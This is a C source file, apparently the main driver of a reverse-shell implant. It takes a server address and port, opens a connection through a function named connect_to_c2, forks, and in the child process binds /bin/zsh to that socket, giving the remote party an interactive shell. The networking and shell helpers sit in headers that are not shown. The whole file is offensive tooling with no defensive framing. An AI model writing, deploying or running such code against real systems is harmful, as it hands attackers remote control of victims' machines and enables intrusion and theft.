#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>         // signal, SIGCHLD (if you choose)
#include <sys/types.h>      // pid_t
#include <sys/wait.h>       // waitpid
#include <unistd.h>         // close, fork
#include "net.h"
#include "shell.h"



int main(int argc, char *argv[])  {
    // parse server address and port from command line arguments
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <server_address> <port>\n", argv[0]);
        return 1;
    }

    // extract command line arguments
    const char *server_address = argv[1];
    const char *port_str = argv[2];
    uint16_t port = 0;

    // Convert port string to integer with validation
    if (parse_port(port_str, &port) != 0) {
        perror("Invalid port");
        return 1;
    }

    // Establish TCP connection to remote server
    int network_socket = connect_to_c2(server_address, port);
    if (network_socket == -1) {
        fprintf(stderr, "Failed to connect to %s:%s\n", server_address, port_str);
        return 1;
    }

    // Create child process for shell handling
    pid_t pid = fork();
    if (pid == 0) {
        // child process: handle the reverse shell
        if (spawn_shell(network_socket, "/bin/zsh") == -1) {
            perror("Failed to spawn shell");
            close(network_socket);
            exit(1);
        }
        // Should never reach here if shell spawns successfully
        exit(1);
    } else if ( pid > 0) {
        // parent process: clean up and exit
        close(network_socket);
        exit(0);
    } else {
        // fork failed: clean up and return error
        perror("Fork failed");
        close(network_socket);
        return 1;
    }

    // close the socket after use (just in case)
    close(network_socket);

    // end of the main function
    return 0;
}